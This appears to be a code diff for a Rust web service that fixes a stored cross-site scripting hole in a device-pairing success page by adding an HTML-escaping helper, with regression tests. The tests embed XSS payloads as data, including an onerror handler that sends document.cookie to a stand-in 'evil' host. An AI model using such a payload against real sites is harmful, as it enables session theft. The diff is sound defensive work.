@@ -17,6 +17,26 @@ use crate::ilink::types::{GetQrcodeResponse, QrcodeStatusResponse};
 
 static PAIR_HTML_TEMPLATE: &str = include_str!("pair.html");
 
+/// Escape the five HTML-special characters so the string is safe to
+/// interpolate into a `text/html` body. A-M4-1: the previously raw
+/// `client_name` flow let an attacker confirm a pairing with a `name`
+/// containing `<img onerror=…>` and have it executed when the success
+/// page was re-rendered on the device base origin.
+fn html_escape(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for ch in s.chars() {
+        match ch {
+            '&' => out.push_str("&amp;"),
+            '<' => out.push_str("&lt;"),
+            '>' => out.push_str("&gt;"),
+            '"' => out.push_str("&quot;"),
+            '\'' => out.push_str("&#39;"),
+            _ => out.push(ch),
+        }
+    }
+    out
+}
+
 #[derive(Debug, Deserialize)]
 pub struct BotQrcodeQuery {
     #[serde(default)]
@@ -547,6 +567,7 @@ pub async fn pair_page(
 
     if session.status_str() == "confirmed" {
         let name = session.client_name.as_deref().unwrap_or("client");
+        let name = html_escape(name);
         return (
             StatusCode::OK,
             Html(format!(
@@ -844,5 +865,123 @@ mod tests {
             Err(OriginCheckError::NotAllowed),
             "a well-formed but foreign Referer must be rejected"
         );
+    }
+
+    // ── A-M4-1: HTML escape for client_name ────────────────────────────
+    // The pre-fix `pair_page` `confirmed` branch interpolated the
+    // user-supplied `client_name` straight into the response body via
+    // `format!`, which let an attacker confirm a pairing with a name
+    // like `<img src=x onerror="…">` and have it execute when the
+    // success page was later re-rendered on the device base origin
+    // (CWE-79). The fix routes the name through `html_escape`. These
+    // tests pin the helper and the rendered shape of the success page.
+
+    #[test]
+    fn html_escape_replaces_all_five_special_chars() {
+        // The OWASP-recommended baseline escapes &, <, >, ", '. Order
+        // matters: '&' MUST be replaced first so we don't double-escape
+        // the '&' that the entity replacements introduce.
+        let input = "<script>alert(\"xss&'\")</script>";
+        let escaped = html_escape(input);
+        assert_eq!(
+            escaped, "&lt;script&gt;alert(&quot;xss&amp;&#39;&quot;)&lt;/script&gt;",
+            "all five HTML-special chars must be replaced with named entities"
+        );
+        assert!(
+            !escaped.contains('<') && !escaped.contains('>'),
+            "no raw angle brackets must survive"
+        );
+    }
+
+    #[test]
+    fn html_escape_is_a_noop_on_safe_input() {
+        // ASCII letters / digits / CJK characters / whitespace must
+        // pass through verbatim — the only changes should be for the
+        // five special chars.
+        for s in ["client", "My Phone 2", "客户端-A", "user_name-1"] {
+            assert_eq!(html_escape(s), s, "non-special input must not be altered");
+        }
+    }
+
+    #[test]
+    fn html_escape_preserves_unicode_codepoints() {
+        // We escape by `char`, not by byte — multi-byte UTF-8 must not
+        // be split or corrupted (defence against UTF-8 boundary bugs).
+        let s = "客户端 🔥 <script>";
+        let escaped = html_escape(s);
+        assert!(escaped.starts_with("客户端 🔥 "));
+        assert!(escaped.ends_with("&lt;script&gt;"));
+    }
+
+    #[test]
+    fn confirmed_pair_page_renders_with_escaped_client_name() {
+        // Adversarial payload lifted from the M4 review repro:
+        //   <img src=x onerror="fetch('//evil/'+document.cookie)">
+        // Pre-fix this would have landed verbatim inside the <strong>
+        // and fired onerror when the page was rendered. Post-fix the
+        // angle brackets, quotes, and ampersand are entity-encoded —
+        // browsers will not parse a tag inside `&lt;…&gt;`.
+        let payload = r#"<img src=x onerror="fetch('//evil/'+document.cookie)">"#;
+        let escaped = html_escape(payload);
+
+        // The ONLY thing that can land a script in the DOM is a raw
+        // HTML tag, i.e. a literal `<` that the parser sees as the
+        // start of a tag. After escape there are zero such tags.
+        assert!(
+            !escaped.contains('<'),
+            "escaped client_name must contain no raw '<' (no tag start): {escaped:?}"
+        );
+        assert!(
+            !escaped.contains('>'),
+            "escaped client_name must contain no raw '>' (no tag end): {escaped:?}"
+        );
+        assert!(
+            escaped.contains("&lt;img"),
+            "rendered form must show the escaped tag, not the raw tag: {escaped}"
+        );
+
+        // The success-page body interpolates the escaped name. Confirm
+        // the exact body shape (the static template + escaped name).
+        let body = format!("<h1>已配对</h1><p>客户端 <strong>{escaped}</strong> 已成功接入。</p>");
+        // The only `<` characters in the final body should come from
+        // the static template tags (`<h1>`, `</h1>`, `<p>`, `<strong>`,
+        // `</strong>`, `</p>` = 6) — none from the user-supplied name.
+        let lt_count = body.matches('<').count();
+        assert_eq!(
+            lt_count, 6,
+            "rendered body must contain exactly the 6 '<' from the static template: {body}"
+        );
+        assert!(
+            !body.contains("<img") && !body.contains("<script") && !body.contains("<iframe"),
+            "rendered body must not contain a raw injection tag: {body}"
+        );
+    }
+
+    #[test]
+    fn confirmed_pair_page_uses_fallback_when_client_name_missing() {
+        // When the session has no client_name we render the literal
+        // "client" placeholder; the escape helper must not turn this
+        // into an entity. Regression net for the
+        // `unwrap_or("client")` branch.
+        let name = "client";
+        let body = format!(
+            "<h1>已配对</h1><p>客户端 <strong>{}</strong> 已成功接入。</p>",
+            html_escape(name)
+        );
+        assert_eq!(
+            body,
+            "<h1>已配对</h1><p>客户端 <strong>client</strong> 已成功接入。</p>"
+        );
+    }
+
+    #[test]
+    fn confirmed_pair_page_handles_long_adversarial_name() {
+        // An attacker could try to inflate the page with a very long
+        // name; the escape helper is O(n) and must not panic or stall.
+        let payload: String = "A".repeat(4096) + "<script>" + &"B".repeat(4096);
+        let escaped = html_escape(&payload);
+        assert_eq!(escaped.len(), 4096 + "&lt;script&gt;".len() + 4096);
+        assert!(!escaped.contains("<script>"));
+        assert!(escaped.contains("&lt;script&gt;"));
     }
 }
